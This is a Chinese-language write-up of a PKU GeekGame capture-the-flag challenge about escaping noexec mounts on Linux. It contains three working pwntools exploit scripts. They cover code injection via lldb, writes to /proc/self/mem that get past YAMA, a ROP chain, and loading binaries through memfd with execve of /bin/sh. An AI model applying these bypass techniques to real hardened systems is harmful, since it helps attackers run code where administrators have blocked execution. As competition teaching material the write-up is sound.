# [Binary] 禁止执行，启动

- 命题人：lrh2000
- Flag 1：200 分
- Flag 2：300 分
- Flag 3：300 分

## 题目描述

<p>你说的对，但是《禁止执行》是由 PKU GeekGame 自主研发的一道全新开放世界 CTF 题目。在这里，你将扮演一名为「Linux Shell 终端用户」的神秘角色，在自由的命令中邂逅内容各异、属性独特的文件们——同时，逐步发掘「Flag」的真相：</p>
<ul>
<li>分别在 Easy 和 Hard 两个线上环境中，执行如下指令（Shellcode）可获得 Flag 1 和 Flag 2。</li>
</ul>
<div class="codehilite" style="background: #f8f8f8"><pre style="line-height: 125%;"><span></span><code>    movq $548, %rax   # __NR_get_flag
    xorq %rdi, %rdi   # id = 0
    movq %rsp, %rsi   # buf = %rsp
    syscall

    movq $1, %rax     # __NR_write
    movq %rax, %rdi   # fd = STDOUT_FILENO
    movq %rsp, %rsi   # buf = %rsp
    movq $32, %rdx    # len = 32
    syscall
</code></pre></div>

<ul>
<li>在 Hard 线上环境中，加载并运行可执行文件 <code>/tmp/hard_flag</code> 可以获得 Flag 3。</li>
</ul>
<p><strong>补充说明：</strong></p>
<ul>
<li>本题不是内核题，因此，本题的预期解法中不涉及任何对内核镜像的分析。</li>
<li>本题不是逆向题，本题的预期解法中不涉及对二进制文件（如 <code>/tmp/hard_flag</code>）的逆向分析。</li>
</ul>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>Flag 1: 利用调试器 <code>/bin/lldb</code> 可以代码注入。</li>
<li>Flag 2: 通过写文件 <code>/proc/[pid]/mem</code> 可以代码注入。</li>
<li>Flag 3: 使用 <a target="_blank" rel="noopener noreferrer" href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">memfd</a> 可以执行任意二进制文件。</li>
</ul>
</div>

**【终端交互：连接到题目】**

**【网页链接：访问北大网盘下载题目源码（约 68 MB）】**

## 预期解法

Linux 中在文件系统挂载时，可以指定 `noexec` 属性，使得文件的可执行权限不生效。下面是一个简单的例子：
```
# mount -o remount,noexec tmpfs /tmp
# ls -al /tmp/hello
-rwxr-xr-x 1 root root 15416 Oct 20 23:11 /tmp/hello
# /tmp/hello
sh: permission denied: /tmp/hello
```

就像上面命令行展示的一样，部分发行版中会以 `noexec` 的属性挂载 `/tmp` 。这样，如果恶意程序直接向 `/tmp` 中写入代码执行就会失败。但事实上，即使系统中所有可写路径都是以 `noexec` 属性挂载的，仍然有多种办法可以绕过这一限制。

**注意：** 本题存档的 [附件](attachment/noexec-give_to_user.tar.xz) 与 PKU GeekGame 线上部署的环境一致，本题存档的 [源码](source/) 与 THUCTF 线上部署的环境一致。后者相比前者做了两处改动：
 - 支持 Flag 的最大长度由 32 上调至 128 ，因为 THUCTF 的 Flag 比较长；
 - 内核配置里启用了 `CONFIG_SECURITY_YAMA` ，关于此参数的详细解释请参考后文 [Flag 2](#flag-2) 部分。

### Flag 1

虽然不允许新程序的直接运行，我们可以尝试劫持正在运行的旧程序。在 Easy 环境中存在调试器 `/bin/lldb` ，则可以通过调试程序的办法进行代码注入，从而执行任意指令，比如：
 - 直接设置 `%rip` 寄存器到某条 `syscall` 指令，然后再按照题目要求设置其他寄存器，单步执行后既可拿到 Flag 。
 - 直接写入内存，用题目要求的指令覆盖程序原本指令，然后继续执行程序。

利用程序如下（也可在 [这里](source/exploits/exp1.py) 找到）：
```python
#!/usr/bin/env python3

from pwn import *

p = process('deploy/run.sh')

p.sendlineafter(b'Enter your choice: ', b'1')

p.sendlineafter(b'/ $ ', b'lldb')

p.sendlineafter(b'(lldb) ', b'target create /bin/busybox')
p.sendlineafter(b'(lldb) ', b'process launch --stop-at-entry')
p.sendlineafter(b'(lldb) ', b'p $rip = 0x4c7ce1')  # syscall
p.sendlineafter(b'(lldb) ', b'p $rax = 548')  # NR_get_flag
p.sendlineafter(b'(lldb) ', b'p $rdi = 0')  # idx
p.sendlineafter(b'(lldb) ', b'p $rsi = ($rsp -= 128)')  # buf
p.sendlineafter(b'(lldb) ', b'si')
p.sendlineafter(b'(lldb) ', b'p (char *)$rsp')

print(p.recvuntil(b'(lldb) '))
```

### Flag 2

在 Hard 环境中没有了调试器，但仍然可以找到其他办法劫持程序。考虑到我们有很多可以进行文件读写的工具（例如 `dd` ），则可以想到探索一下特殊文件系统里的特殊文件。比如 `/proc/self/mem` 事实上允许了以文件的形式访问当前进程地址空间，结合 `dd` 工具能够在任意偏移读写文件，就可以做到直接编辑程序内存。

不过需要注意的一点是，有权限打开 `/proc/[pid]/mem` 等价于当前进行对该进程有调试权限。而在 PKU GeekGame 的线上环境中，因为内核配置没有开启 `CONFIG_SECURITY_YAMA` ，所以任意两个进程只要同用户就可以互相调试，也可以互相打开 `/proc/[pid]/mem` 。这实际上是因为出题人在准备环境的时候不知道 `CONFIG_SECURITY_YAMA` 需要手动开启，因而忘记了开启（ THUCTF 线上环境无此问题，因为修复不支持长 Flag 导致 Flag 被截断问题的时候将前述问题一并修复了）。

对于 `CONFIG_SECURITY_YAMA` 开启的场景，子进程不被允许父进程，所以也不能打开父进程的 `/proc/[pid]/mem` 文件：
```
$ dd if=/proc/$$/mem
dd: failed to open '/proc/228238/mem': Permission denied
```

这点需要利用一些奇妙语法绕过：
```
$ exec 3<>/proc/self/mem
$ ls /proc/self/fd/3 -al
lrwx------ 1 linux linux 64 Oct 21 00:28 /proc/self/fd/3 -> /proc/141090/mem
$ dd <&3
dd: error reading 'standard input': Input/output error
```

第一行的 `exec` 打开了 `/proc/self/mem` （这里 `self` 是 shell 本身），然后通过重定向（实际上通过 `dup` 系统调用复制文件描述符），让 `dd` 直接访问到了已经打开的 `mem` 文件（属于 shell 进程）。重定向过程不涉及文件打开，故其并无权限检查。最后得到了 `Input/output error` 是因为没有给 `dd` 指定正确的偏移，所以它访问的地址无效，这一点可以结合 `/proc/[pid]/maps` 的信息轻松解决。

还有一个值得一提的“特性”：通过 `/proc/[pid]/mem` 实际上能直接写代码段，虽然代码段是只读映射的，这是因为内核在处理写请求时候传递了一个 `FOLL_FORCE` 的参数，具体可以参考 [这篇文章](https://blog.cloudflare.com/diving-into-proc-pid-mem/) 。

但出题人并没有注意到最后这个特性，所以通过覆盖栈里的返回地址实现的 ROP ，因此利用程序比较繁琐。

利用程序如下（也可在 [这里](source/exploits/exp2.py) 找到）：
```python
#!/usr/bin/env python3

from pwn import *

p = process('deploy/run.sh')

p.sendlineafter(b'Enter your choice: ', b'2')
p.recvuntil(b'/ $ ')

def sys(cmd):
    p.sendline(cmd.encode())
    res = p.recvuntil(b'/ $ ')
    return res.split(b'\n', 1)[1][:-4]

def stack_top():
    res = sys('cat /proc/$$/maps | grep stack')
    addr = res.split()[0].split(b'-')[1]
    return int(addr.decode(), 16)

def open_mem():
    sys('exec 3<>/proc/self/mem')

def read_mem(sz, off=0):
    if off < 0:
        off += 2**64
    res = sys(f'dd bs=1 count={sz} skip={off} <&3')
    return res[:sz]

def seek_mem(off):
    read_mem(0, off)

def write_mem(val, off=0):
    if off < 0:
        off += 2**64
    p.sendline(f'dd bs=1 count={len(val)} seek={off} >&3'.encode())
    p.sendline(val)

open_mem()

BLK_SZ = 4096
ok = False
seek_mem(stack_top() + BLK_SZ)
for _ in range(16):
    data = read_mem(BLK_SZ, -BLK_SZ * 2)
    pos = data.find(p64(0x4c7cce))
    if pos > 0:
        # FIXME: Why do we have to do this?
        pos -= pos & 7
        seek_mem(-BLK_SZ + pos)
        ok = True
        break
assert ok

def set_rdi(rdi):
    #  4d566d:       5f                      pop    %rdi
    #  4d566e:       c3                      ret
    return p64(0x4d566d) + p64(rdi)

def set_rsi(rsi):
    #  4d8b82:       5e                      pop    %rsi
    #  4d8b83:       c3                      ret
    return p64(0x4d8b82) + p64(rsi)

def set_rdx(rdx):
    #  4d5e2f:       5a                      pop    %rdx
    #  4d5e30:       c3                      ret
    return p64(0x4d5e2f) + p64(rdx)

def set_rax(rax):
    #  4d985c:       58                      pop    %rax
    #  4d985d:       c3                      ret
    return p64(0x4d985c) + p64(rax)

def syscall0(nr):
    #  4d8765:       0f 05                   syscall
    #  4d8767:       c3                      ret
    return set_rax(nr) + p64(0x4d8765)

def syscall1(nr, arg0):
    return set_rdi(arg0) + syscall0(nr)

def syscall2(nr, arg0, arg1):
    return set_rsi(arg1) + syscall1(nr, arg0)

def syscall3(nr, arg0, arg1, arg2):
    return set_rdx(arg2) + syscall2(nr, arg0, arg1)

def sys_get_flag(idx, buf):
    return syscall2(548, idx, buf)

def sys_write(fd, buf, sz):
    return syscall3(1, fd, buf, sz)

def sys_exit_group(code):
    return syscall1(231, code)

# 00400000-00512000 r-xp 00000000 00:02 6                                  /bin/busybox
# 00711000-00714000 rw-p 00111000 00:02 6                                  /bin/busybox
BUF = 0x711000

FLAG_ID = 0
STDERR_FILENO = 2
MAX_FLAG_LEN = 128

payload = sys_get_flag(FLAG_ID, BUF)
payload += sys_write(STDERR_FILENO, BUF, MAX_FLAG_LEN)
payload += sys_exit_group(0)
write_mem(payload)

print(p.recvall(timeout=2))
```

### Flag 3

从执行任意代码到执行任意（动态链接的）可执行文件？~~大力出奇迹，手写加载器即可通过这道题目~~（但这确实是校内唯一解的做法）。

虽然环境里 `/proc` 也是 `noexec` 参数挂载的，但实际上里面可以开出能直接执行的文件，这就是二阶段提示里提到的 [memfd](https://man7.org/linux/man-pages/man2/memfd_create.2.html) 。

利用执行任意代码的能力，可以创建任意多个 `memfd` ，然后可以在 `/proc/[pid]/fd/` 目录下面找到它们，这些文件是即可以写又可以执行的。这是一个简单的示例：
```
$ python -q
>>> import os
>>> os.memfd_create("hello", 0)
3
>>> os.execlp("bash", "bash")
$ ls /proc/$$/fd/3 -al
lrwx------ 1 linux linux 64 Oct 21 00:48 /proc/141385/fd/3 -> '/memfd:hello (deleted)'
$ cat <<EOF >/proc/$$/fd/3
> #!/bin/sh
> echo hello world
> EOF
$ /proc/$$/fd/3
hello world
$ exit
```

对于本题，用符号链接（符号链接可以处于 `noexec` 挂载的位置，可执行的判断只据被链接到的对象决定）给 `/proc/[pid]/fd/` 里的 `memfd` 命名，然后即可执行
```
LD_LIBRARY_PATH=/home/guest /home/guest/ld-linux-x86-64.so.2 /home/guest/hard_flag
```

注意所有动态链接库也需要用同样的方式处理（即放入 `memfd` 中），否则 `noexec` 挂载中的文件在内存映射时不能被指定为可执行（即 `mmap` 系统调用会被调用以映射代码段，但其携带的 `PROT_EXEC` 标志与 `noexec` 挂载模式冲突，导致映射被内核拒绝），于是动态库加载失败、加载器报错退出。

利用程序如下（也可在 [这里](source/exploits/exp3.py) 找到）：
```python
#!/usr/bin/env python3

from pwn import *

p = process('deploy/run.sh')

p.sendlineafter(b'Enter your choice: ', b'2')
p.recvuntil(b'/ $ ')

def sys(cmd):
    p.sendline(cmd.encode())
    res = p.recvuntil(b'/ $ ')
    return res.split(b'\n', 1)[1][:-4]

def stack_top():
    res = sys('cat /proc/$$/maps | grep stack')
    addr = res.split()[0].split(b'-')[1]
    return int(addr.decode(), 16)

def open_mem():
    sys('exec 3<>/proc/self/mem')

def read_mem(sz, off=0):
    if off < 0:
        off += 2**64
    res = sys(f'dd bs=1 count={sz} skip={off} <&3')
    return res[:sz]

def seek_mem(off):
    read_mem(0, off)

def write_mem(val, off=0):
    if off < 0:
        off += 2**64
    p.sendline(f'dd bs=1 count={len(val)} seek={off} >&3'.encode())
    p.sendline(val)

open_mem()

BLK_SZ = 4096

ok = False
addr = stack_top()

seek_mem(addr + BLK_SZ)
for _ in range(16):
    data = read_mem(BLK_SZ, -BLK_SZ * 2)
    addr -= BLK_SZ

    # wait4()'s ret addr
    pos = data.find(p64(0x4c7cce))
    if pos > 0:
        # FIXME: Why do we have to do this?
        pos -= pos & 7

        seek_mem(-BLK_SZ + pos)
        addr += pos

        ok = True
        break

assert ok

def set_rdi(rdi):
    #  4d566d:       5f                      pop    %rdi
    #  4d566e:       c3                      ret
    return p64(0x4d566d) + p64(rdi)

def set_rsi(rsi):
    #  4d8b82:       5e                      pop    %rsi
    #  4d8b83:       c3                      ret
    return p64(0x4d8b82) + p64(rsi)

def set_rdx(rdx):
    #  4d5e2f:       5a                      pop    %rdx
    #  4d5e30:       c3                      ret
    return p64(0x4d5e2f) + p64(rdx)

def set_rax(rax):
    #  4d985c:       58                      pop    %rax
    #  4d985d:       c3                      ret
    return p64(0x4d985c) + p64(rax)

def syscall0(nr):
    #  4d8765:       0f 05                   syscall
    #  4d8767:       c3                      ret
    return set_rax(nr) + p64(0x4d8765)

def syscall1(nr, arg0):
    return set_rdi(arg0) + syscall0(nr)

def syscall2(nr, arg0, arg1):
    return set_rsi(arg1) + syscall1(nr, arg0)

def syscall3(nr, arg0, arg1, arg2):
    return set_rdx(arg2) + syscall2(nr, arg0, arg1)

def sys_get_flag(idx, buf):
    return syscall2(548, idx, buf)

def sys_write(fd, buf, sz):
    return syscall3(1, fd, buf, sz)

def sys_exit_group(code):
    return syscall1(231, code)

def sys_memfd_create(name, flags):
    return syscall2(319, name, flags)

def sys_dup2(oldfd, newfd):
    return syscall2(33, oldfd, newfd)

def sys_execve(filename, argv, envp):
    return syscall3(59, filename, argv, envp)

OFF_ARGV = 0x160
OFF_ENVP = 0x168
OFF_BINSH = 0x170

payload = sys_memfd_create(0x400000, 0) * 4
payload += sys_dup2(2, 1)
payload += sys_execve(
            addr + OFF_BINSH, \
            addr + OFF_ARGV, \
            addr + OFF_ENVP)

assert len(payload) <= OFF_ARGV
payload = payload.ljust(OFF_ARGV)
payload += p64(addr + OFF_BINSH)

assert len(payload) == OFF_ENVP
payload += p64(0)

assert len(payload) == OFF_BINSH
payload += b'/bin/sh\x00'

write_mem(payload)
p.recvuntil(b'/ $ ')
p.recvuntil(b'/ $ ')

fd = 4
for file in {'libgcc_s.so.1', \
        'libc.so.6', \
        'ld-linux-x86-64.so.2', \
        'hard_flag'}:
    sys(f'cat /tmp/{file} >> /proc/$$/fd/{fd}')
    sys(f'ln -s /proc/$$/fd/{fd} /home/guest/{file}')
    fd += 1

cmd = f'LD_LIBRARY_PATH=/home/guest ' + \
        '/home/guest/ld-linux-x86-64.so.2 ' + \
        '/home/guest/hard_flag'
print(sys(cmd))
```

## 非预期解法

 - Flag 1: 注意到 LLDB 可以直接使用 `expr __asm` 执行汇编代码。
 - Flag 2: 注意到 [DDexec](https://github.com/arget13/DDexec) 可以直接通过这道题目。
 - Flag 3: 大力出奇迹，手写加载器即可通过这道题目，详情可参见优秀选手 WP 。
